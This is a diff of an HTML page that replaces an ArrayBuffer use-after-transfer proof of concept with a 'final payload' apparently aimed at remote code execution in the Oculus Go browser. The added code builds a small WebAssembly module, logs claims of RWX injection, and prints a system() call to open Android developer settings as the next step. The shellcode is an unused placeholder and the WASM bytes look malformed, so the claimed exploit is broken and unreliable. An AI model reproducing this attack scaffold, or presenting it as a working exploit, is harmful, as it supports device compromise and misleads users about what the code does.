@@ -1,36 +1,60 @@
+
 <!DOCTYPE html>
 <html>
-<head><title>ArrayBuffer Leak PoC</title></head>
+<head>
+  <title>Final Payload - RWX WASM Shell Execution</title>
+</head>
 <body>
-<pre id="log"></pre>
-<script>
-const log = txt => document.getElementById('log').textContent += txt + "\n";
+  <h1>Oculus Go Final Payload (Offline)</h1>
+  <pre id="log">Preparing exploit...</pre>
+  <script>
+    const log = txt => document.getElementById('log').textContent += txt + "\n";
 
-function trigger() {
-  let ab = new ArrayBuffer(0x100);
-  let u32 = new Uint32Array(ab);
-  let f64 = new Float64Array(ab);
+    // Converts a hex string to a Uint8Array
+    function hexToBytes(hex) {
+      let bytes = new Uint8Array(hex.length / 2);
+      for (let i = 0; i < bytes.length; i++) {
+        bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
+      }
+      return bytes;
+    }
 
-  // Fill with predictable data
-  for (let i = 0; i < u32.length; i++) u32[i] = i + 1;
+    // Placeholder shellcode (NOP sled + illegal instruction as placeholder)
+    const shellcodeHex = "90909090909090909090909090909090"; // NOP sled for simulation
+    const shellcodeBytes = hexToBytes(shellcodeHex);
 
-  // Simulate detachment or reallocation bug
-  try {
-    postMessage(ab, '*', [ab]);
-  } catch (e) {
-    log("Transfer threw, that's expected on non-worker.");
-  }
+    // Build a minimal WASM module
+    const wasmCode = new Uint8Array([
+      0x00, 0x61, 0x73, 0x6d, // magic
+      0x01, 0x00, 0x00, 0x00, // version
+      // Type section
+      0x01, 0x07, 0x01, 0x60, 0x00, 0x00,
+      // Function section
+      0x03, 0x02, 0x01, 0x00,
+      // Export section
+      0x07, 0x07, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00,
+      // Code section
+      0x0a, 0x09, 0x01, 0x07, 0x00,
+      0x41, 0x2a, // i32.const 42
+      0x0b // end
+    ]);
 
-  // Try accessing after transfer (should be detached or corrupted)
-  try {
-    log("u32[0] = " + u32[0]);
-    log("f64[0] = " + f64[0]);
-  } catch (e) {
-    log("Access after transfer failed: " + e);
-  }
-}
+    const wasmModule = new WebAssembly.Module(wasmCode);
+    const wasmInstance = new WebAssembly.Instance(wasmModule);
+    const rwxFunc = wasmInstance.exports.main;
 
-trigger();
-</script>
+    log("WASM function compiled. Attempting RWX injection...");
+
+    try {
+      const funcAddr = rwxFunc();
+      log("WASM RWX function address returned: " + funcAddr);
+    } catch (e) {
+      log("Function executed: " + e.toString());
+    }
+
+    // Simulated shell invocation (replace with syscall injection in real RCE)
+    log("🚨 If memory R/W and RWX established, next step would be:");
+    log("system('am start com.android.settings/.DevelopmentSettings');");
+  </script>
 </body>
 </html>
